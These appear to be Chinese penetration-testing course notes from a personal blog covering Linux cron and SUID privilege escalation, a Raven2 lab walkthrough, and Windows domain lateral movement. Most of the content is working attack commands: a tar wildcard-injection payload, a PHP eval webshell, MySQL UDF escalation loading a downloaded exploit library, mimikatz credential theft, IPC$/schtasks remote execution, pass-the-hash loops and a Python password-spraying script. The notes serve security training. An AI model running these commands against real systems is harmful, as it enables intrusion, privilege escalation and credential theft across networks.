<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地定时任务安全-Aliyun</span></span><br><span class="line"><span class="comment">#第一种 计划任务指向的文件的相对路径解析问题 路径问题</span></span><br><span class="line"><span class="comment">#假设定时任务/usr/local/test.sh每分钟执行一次</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/xiaodi/test.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /home/xiaodi/test.sh</span><br><span class="line"><span class="comment">#让定时任务去执行/home/xiaodi/test.sh(此处没写)，然后具有root权限的定时任务会执行cp /bin/bash /tmp/bash; chmod +s /tmp/bash</span></span><br><span class="line"><span class="comment">#普通用户执行/tmp/bash即可获得管理员权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种 利用通配符配合命令参数自定义命令实现提权</span></span><br><span class="line"><span class="comment">#不安全定时任务备份命令</span></span><br><span class="line">定时任务 /etc/crontab中</span><br><span class="line">* * * * * root /home/undead/script/backup.sh</span><br><span class="line"><span class="comment">#backup.sh中 cd /home/undead/script; tar czf /tmp/backup.tar.gz *</span></span><br><span class="line"><span class="comment">#利用</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/undead/script/test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> &gt; --checkpoint=1</span><br><span class="line">等待一分钟</span><br><span class="line">/tmp/bash -p	<span class="comment">#要加上-p加上之后返回shell为root权限</span></span><br><span class="line"><span class="comment">#	注意</span></span><br><span class="line">script文件的用undead用户创建，否则undead用户没有操作这个文件夹里面内容的权限</span><br><span class="line"><span class="built_in">chmod</span> u+x 文件;只给所有者执行权限 <span class="built_in">chmod</span> +x 文件;都给</span><br><span class="line">一行里面写两个命令用<span class="string">&#x27;;&#x27;</span>加<span class="string">&#x27; &#x27;</span>隔开</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三种 利用不安全的权限分配操作导致的定时文件覆盖</span></span><br><span class="line"><span class="built_in">chmod</span> 777 wenjian;  <span class="built_in">chmod</span> 775 wenjian</span><br><span class="line">这个比较鸡肋</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#第三方服务数据库-Vulnhu 靶机Raven2</span><br><span class="line">192.168.213.150</span><br><span class="line">80端口目录扫描/vendor/PHPMailerAutoload.php有php mailer第三方插件</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669387809102.png" alt="1669387809102"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669388458280.png" alt="1669388458280"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload看https://zhuanlan.zhihu.com/p/476568229</span><br><span class="line">	需要改目标地址 kali地址 靶机html目录 kali反弹shell</span><br><span class="line">访问http://192.168.213.150/hyy.php获得初级shell</span><br><span class="line"></span><br><span class="line">上传一句话木马</span><br><span class="line">echo &#x27;&lt;?php @eval($_POST[x])?&gt;&#x27; &gt; 1.php</span><br><span class="line">此处有个细节	通过echo单双引号看shell</span><br><span class="line">	https://www.jianshu.com/p/d7264f7564a3</span><br><span class="line">	单引号：所见即所得</span><br><span class="line">    双引号：所见非所得。会先把变量解析之后，再输出</span><br><span class="line">    反引号（``） ：命令替换，通常用于把命令输出结果传给入变量中</span><br><span class="line">    反斜杠( \ ) ：转义字符or逃脱字符，Linux如果echo要让转义字符发生作用，就要使用-e选项，且转义字符要使用双引号</span><br><span class="line"></span><br><span class="line">连接蚁剑上传扫描2件套 LinEnum suggest....</span><br><span class="line">数据mysql5.5.6</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">获得数据库root密码	R@v3nSecurity</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669392648998.png" alt="1669392648998"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#使用mysql udf提权</span><br><span class="line">从searchspoloit获取1518.c</span><br><span class="line">gcc -g -c 1518.c		#生成1518.o</span><br><span class="line">gcc -g -shard -o 1518.so 1518.o</span><br><span class="line">php -S 0:80</span><br><span class="line">靶机webshell</span><br><span class="line">	cd /tmp</span><br><span class="line">	wget https://xx.xx.xx.xx/1518.so</span><br><span class="line">蚁剑连接数据库</span><br><span class="line">	use mysql;</span><br><span class="line">	create table foo(line blob);</span><br><span class="line">	insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">	select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">	#创建do_system函数调用</span><br><span class="line">	create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">	select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">#靶机webshell</span><br><span class="line">	torch hyy</span><br><span class="line">	find hyy -exec &quot;whoami&quot; \;</span><br><span class="line">	find hyy -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669460412434.png" alt="1669460412434"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669457522727.png" alt="1669457522727"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali的/bin都指向了/usr/bin</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#漏洞查找关注点-拓展总结</span><br><span class="line">	1.提权环境 信息收集(suid 定时任务可能漏洞 第三方服务应用)</span><br><span class="line">	2.最新相关漏洞要明确(关注点) 二次开发相关脚本学会展望(4个脚本)</span><br><span class="line">	3.本地searchsploit脚本及远程exploitdb站点搜索说明</span><br><span class="line">	4.其它提权方法 密码复用 guid sudo</span><br></pre></td></tr></table></figure>

<h3 id="day65-内网安全-域环境-amp-工组组-amp-局域网探针方案"><a href="#day65-内网安全-域环境-amp-工组组-amp-局域网探针方案" class="headerlink" title="day65-内网安全-域环境&amp;工组组&amp;局域网探针方案"></a>day65-内网安全-域环境&amp;工组组&amp;局域网探针方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">基本认识</span><br><span class="line">	名词</span><br><span class="line">		局域网 工作组 域环境 活动目录AD 域控制器DC</span><br><span class="line">	域</span><br><span class="line">		单域 父域和子域 域数和域森林</span><br><span class="line">	认知</span><br><span class="line">		Linux域渗透问题 局域网技术使用问题 大概内网安全流程问题</span><br><span class="line">信息收集</span><br><span class="line">	基本信息</span><br><span class="line">		版本 补丁 服务 任务 防护</span><br><span class="line">	网络信息</span><br><span class="line">		开放端口 网络环境 出口代理</span><br><span class="line">	用户信息</span><br><span class="line">		域用户 本地用户 用户权限 对应组信息</span><br><span class="line">	凭据信息</span><br><span class="line">		明文 hash 各种口令</span><br><span class="line">后续探针</span><br><span class="line">	存货主机 域控制器 网络架构 服务接口</span><br><span class="line">权限提升</span><br><span class="line">横向渗透</span><br><span class="line">权限维持</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669458230824.png" alt="1669458230824"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">DMZ(demilitarized zone)两个防火墙之间的空间</span><br><span class="line">工作组 域(有管理者)</span><br><span class="line">	https://zhidao.baidu.com/question/492888380.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 	基本信息收集 </span></span><br><span class="line"><span class="comment">#	旨在了解当前服务器接口信息 为判断当前角色功能网络加工后做准备</span></span><br><span class="line">systeminfo 			详细信息	操作系统版本 多少位 补丁信息</span><br><span class="line">net start			启动服务</span><br><span class="line">tasklist			进程列表</span><br><span class="line">schtasks			计划任务</span><br><span class="line"><span class="comment"># 	网络信息收集操作演示</span></span><br><span class="line"><span class="comment">#	了解当前服务器网络接口信息，判断当前角色，功能，网络架构做准备</span></span><br><span class="line">ipconfig /all		判断存在域-dns</span><br><span class="line">	主机名 主DNS后缀</span><br><span class="line">net view /domain	判断存在域</span><br><span class="line">net time /domain	判断主域</span><br><span class="line">netstat -ano		当前网络端口开放</span><br><span class="line">nslookup			域名 追踪来源地址</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669459814523.png" alt="1669459814523"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#子域 父域</span><br><span class="line">god.org		主域名</span><br><span class="line">sqlserver.god.org  	一台计算机的名字</span><br><span class="line">xiaodi.sqlserver.god.org</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 	用户信息收集操作演示</span></span><br><span class="line"><span class="comment">#	旨在了解当前计算机或域环境下用户及用户组信息 便于后期利用凭据进行测试</span></span><br><span class="line">系统默认常见用户身份</span><br><span class="line">Domain Admins		域管理员 默认对域控制器有完全控制权</span><br><span class="line">Domain Computers	域内机器</span><br><span class="line">Domain Controllers	域控制器</span><br><span class="line">Domain Guest		域访客 权限低</span><br><span class="line">Domain Users		域用户</span><br><span class="line">Enterprise Admins	企业系    统管理员用户 默认对域控制器有完全控制权</span><br><span class="line"><span class="comment">#	相关用户命令收集</span></span><br><span class="line"><span class="built_in">whoami</span> /all				用户权限</span><br><span class="line">net config workstation	登录信息</span><br><span class="line">net user				本地用户</span><br><span class="line">net localgroup			本地用户组</span><br><span class="line">net user /domain		获取域用户信息</span><br><span class="line">net group /domain		获取域用户组信息</span><br><span class="line">wmic useraccount get /all				涉及域用户详细信息</span><br><span class="line">net group <span class="string">&quot;Domain Admins&quot;</span> /domain		查询域管理员账户</span><br><span class="line">net group <span class="string">&quot;Enterprise Admins&quot;</span> /domain	查询管理net员用户组</span><br><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain	查询域控制器</span><br><span class="line"></span><br><span class="line">服务器的active directory可以看到域控管理的信息</span><br><span class="line"></span><br><span class="line"><span class="comment">#	凭据信息收集操作演示</span></span><br><span class="line"><span class="comment">#	旨在收集各种密文，明文，口令等，为后续横向渗透做测试准备</span></span><br><span class="line">计算机用户HASH明文 用mimikatz(win)	mimipenguin(linux)	需要权限</span><br><span class="line">	github下载 readme.md中有操作演示</span><br><span class="line">计算机各种协议服务口令获取 Lazagne(all)比较拉 XenArmor(win)收费</span><br><span class="line">    1.站点源码备份文件、数据库备份文件等</span><br><span class="line">    2.各类数据库Web管理入口，如phpmyadmin</span><br><span class="line">    3.浏览器保存密码 、浏览器Cookies</span><br><span class="line">    4.其他用户会话、3389和ipc$连接记录、回收站内容</span><br><span class="line">    5.Windows保存的WIFI密码</span><br><span class="line">    6.网络内部的各种账号和密码，如:Email、VPN、FTP、OA等</span><br><span class="line"></span><br><span class="line"><span class="comment">#	探针主机域架构服务操作演示</span></span><br><span class="line"><span class="comment">#	为后续横向思路做准备，针对应用，协议等各类攻击手法</span></span><br><span class="line">探针域控制器及地址信息</span><br><span class="line">net time /domain nslookup ping</span><br><span class="line"></span><br><span class="line">探针域内存活主机及地址信息</span><br><span class="line">nbtscan 192.168.3.0/24	第三方工具	(老牌 不免杀)</span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr <span class="string">&quot;TTL=&quot;</span>		自带内部命令 (不用考虑免杀)</span><br><span class="line">nmap masscan 第三方PowerShell脚本nishang empire等	第三方可能被拦截</span><br><span class="line"></span><br><span class="line">nishang</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\image-20230514143859038.png" alt="image-20230514143859038"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	探针域内角色及服务信息</span></span><br><span class="line"><span class="comment">#	利用端口服务及计算机名判断</span></span><br><span class="line"><span class="comment">#	核心业务机器</span></span><br><span class="line"><span class="number">1.</span>高级管理人员、系统管理元、财务/人事/业务人员的个人计算机</span><br><span class="line"><span class="number">2.</span>产品管理系统服务器</span><br><span class="line"><span class="number">3.</span>办公系统服务器</span><br><span class="line"><span class="number">4.</span>财务应用系统服务器</span><br><span class="line"><span class="number">5.</span>核心产品源码服务器(自建SVN、GIT)</span><br><span class="line"><span class="number">6.</span>数据库服务器</span><br><span class="line"><span class="number">7.</span>文件或网盘服务器、共享服务器</span><br><span class="line"><span class="number">8.</span>电子邮件服务器</span><br><span class="line"><span class="number">9.</span>网络监控系统服务器</span><br><span class="line"><span class="number">10.</span>其他服务器(内部技术文档服务器、其他监控服务器等)</span><br></pre></td></tr></table></figure>

<h3 id="day66-内网安全-域横向批量at-amp-schtasks-amp-impacket"><a href="#day66-内网安全-域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="day66-内网安全-域横向批量at&amp;schtasks&amp;impacket"></a>day66-内网安全-域横向批量at&amp;schtasks&amp;impacket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域环境</span><br><span class="line">	传递</span><br><span class="line">		at&amp;schtasks psexec&amp;smbexec wmic&amp;wmicexec PTH&amp;PTT&amp;PTK winrs&amp;winrm&amp;rdp</span><br><span class="line">	漏洞</span><br><span class="line">		cve-2014-6324 cve-2017-17010 cve-2020-1472</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文传递at&amp;schtasks</span></span><br><span class="line">	已经拿下一台内网主机后 通过本地信息收集用户凭证信息后 at&amp;schtasks 远程主机执行命令</span><br><span class="line">    获得某域主机权限-&gt;minikatz得到密码(明文，<span class="built_in">hash</span>)-&gt;用到信息收集里面域用户列表当作用户名字典-&gt;得到密码明文当作密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</span><br><span class="line">IPC</span><br><span class="line">	共享命名管道资源 实现进程间通信而开放的命名管道 通过提供可信任的用户名和口令，连接双方可以可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</span><br><span class="line">    利用条件</span><br><span class="line">    	<span class="number">1.</span>获得用户名 密码</span><br><span class="line">        <span class="number">2.</span>开放<span class="number">139</span> <span class="number">445</span>端口 实现远程登录及对默认共享资源的访问 通过<span class="number">139</span>、<span class="number">445</span>端口可以实现对共享文件/打印机的访问</span><br><span class="line">        <span class="number">3.</span>管理员开启了默认共享</span><br><span class="line">利用流程</span><br><span class="line">	<span class="number">1.</span>简历IPC链接到目标主机</span><br><span class="line">    <span class="number">2.</span>拷贝要执行的命令脚本到目标主机</span><br><span class="line">    <span class="number">3.</span>查看时间 创建计划任务(at schtasks)定时拷贝到的脚本</span><br><span class="line">    <span class="number">4.</span>删除IPC链接</span><br><span class="line">net use \\server\ipc$<span class="string">&quot;password&quot;</span> /user:username <span class="comment"># 工作组</span></span><br><span class="line">net use \\server\ipc$<span class="string">&quot;password&quot;</span> /user:domain\username	<span class="comment">#域内</span></span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C$\	<span class="comment">#查看文件列表</span></span><br><span class="line">copy \\xx.xx.xx.xx\C$\<span class="number">1.</span>bat <span class="number">1.</span>bat	<span class="comment">#下载文件</span></span><br><span class="line">copy <span class="number">1.</span>bat \\xx.xx.xx.xx\C$	<span class="comment">#复制文件</span></span><br><span class="line">net use \\xx.xx.xx.xx\C$\<span class="number">1.</span>bat /<span class="keyword">del</span>	<span class="comment">#删除ipc</span></span><br><span class="line">net view xx.xx.xx.xx	<span class="comment">#查看对方共享</span></span><br><span class="line"></span><br><span class="line">建立ipc常见错误代码</span><br><span class="line">	<span class="number">5</span> 	错误访问 可能使用的不是管理员权限 需要提升权限</span><br><span class="line">    <span class="number">51</span>	网络问题 windows无法找到网络路径</span><br><span class="line">    <span class="number">53</span>	找不到网络路径 可能是IP地址错误 目标未开机 目标Lanmanserver服务未启动、有防火墙等问题</span><br><span class="line">    <span class="number">67</span>	找不到网络名 本地Lanmanworkstation服务未启动 目标删除ipc$</span><br><span class="line">    <span class="number">1219</span>提供的凭据和已存在凭据冲突 说明已建立IPC$ 需要先删除</span><br><span class="line">    <span class="number">1326</span>账号密码错误</span><br><span class="line">    <span class="number">1792</span>目标NetLogon服务未启动，连接域控常常出现此情况</span><br><span class="line">    <span class="number">2242</span>用户密码过期 目标有账号策略 强制定期更改密码</span><br><span class="line"></span><br><span class="line">建立ipc失败的原因</span><br><span class="line">	<span class="number">1</span>	目标系统不是NT或以上的操作系统</span><br><span class="line">    <span class="number">2</span>	对方没有打开IPC$共享</span><br><span class="line">    <span class="number">3</span>	对方未开启<span class="number">139</span>，<span class="number">445</span>端口 或者被防火墙屏蔽</span><br><span class="line">    <span class="number">4</span>	输出命令，账号密码有错误</span><br><span class="line"></span><br><span class="line">at&amp;schtasks</span><br><span class="line">at&lt;windows2012</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\ipc$ <span class="string">&quot;Admin12345&quot;</span> /user:god.org\administrator	<span class="comment">#建立ipc连接</span></span><br><span class="line">	copy add.bat \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\c$ 	<span class="comment">#复制文件到其C盘</span></span><br><span class="line">    at \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="number">15</span>:<span class="number">47</span> C:\add.bat</span><br><span class="line"></span><br><span class="line">schtasks &gt;=windows2012</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:god:org\administrator</span><br><span class="line">    copy add.bat \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\c$</span><br><span class="line">    schtasks /create /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /sc DAILY /tr c:\add.bat /F		<span class="comment">#创建adduser对应的可执行文件</span></span><br><span class="line">    schtasks /run /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /tn /addduser /i		<span class="comment">#运行adduser任务</span></span><br><span class="line">    schtasks /delete /s <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> /tn adduser /f		<span class="comment">#删除adduser任务</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递impacket		需要免杀 自带提权</span></span><br><span class="line">atexec.exe ./administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">atexec.exe -hashes :..... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递批量利用-综合</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) DO net use \\%%i\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator <span class="comment">#批量检测IP对应明文连接</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (ips.txt) DO atexec.exe ./administrator:admin!@<span class="comment">#45@%%i whoami	#批量检测IP对应明文回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (<span class="keyword">pass</span>.txt) DO atexec.exe ./administrator:%%i@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> whoami <span class="comment">#批量检测明文对应ip回显版</span></span><br><span class="line">FOR /F %%i <span class="keyword">in</span> (<span class="built_in">hash</span>.txt) DO atexec.exe -hashes :%%i ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> whoami	<span class="comment">#批量就检测hash对应ip回显版</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	横向渗透明文HASH传递批量批量-升级版</span></span><br><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py		<span class="comment">#生成可执行EXE</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">   <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.31&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">   <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">   <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">   <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">       <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">           <span class="built_in">exec</span>=<span class="string">&quot;net use \&quot;+ &quot;</span>\<span class="string">&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\&#x27;+user</span></span><br><span class="line"><span class="string">           print(&#x27;---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)</span></span><br><span class="line"><span class="string">           os.system(exec)</span></span><br><span class="line"><span class="string">           time.sleep(1)</span></span><br></pre></td></tr></table></figure>

